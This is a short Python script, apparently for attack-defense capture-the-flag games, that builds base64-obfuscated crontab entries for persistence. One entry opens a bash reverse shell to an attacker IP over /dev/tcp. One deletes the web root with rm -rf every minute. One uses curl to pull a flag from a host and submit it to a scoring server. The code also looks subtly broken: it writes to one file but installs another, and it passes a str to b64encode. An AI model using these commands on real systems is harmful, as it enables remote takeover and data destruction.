#!/usr/bin/env python3
import base64


def crontab_reverse(reverse_ip, reverse_port):
    crontab_path = "/tmp"
    cmd = 'bash -i >& /dev/tcp/%s/%d 0>&1' % (reverse_ip, reverse_port)
    crontab_cmd = "* * * * * bash -c '%s'\n" % cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp_rev.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    return cmd


def crontab_rm(rm_paths='/var/www/html/'):
    crontab_path = "/tmp"
    cmd = '/bin/rm -rf %s' % rm_paths
    crontab_cmd = "* * * * * %s\n" % cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp_rm.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    return cmd


def crontab_flag_submit(flag_server, flag_port, flag_api, flag_token,
                        flag_host):
    crontab_path = '/tmp'
    cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s&flag=$(curl %s)" ' % (
        flag_server, flag_port, flag_api, flag_token, flag_host)
    crontab_cmd = "* * * * * %s\n" % cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp_submit.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    return cmd


#依情况修改接口
cmd = crontab_flag_submit(flag_server='0.0.0.0',
                          flag_port='8888',
                          flag_api='submit',
                          flag_token='bcbe3365e6ac95ea2c0343a2395834dd',
                          flag_host='http://192.168.100.1/Getkey')
print(cmd)

cmd = crontab_reverse('192.168.1.1', 6666)
print(cmd)

cmd = crontab_rm()
print(cmd)
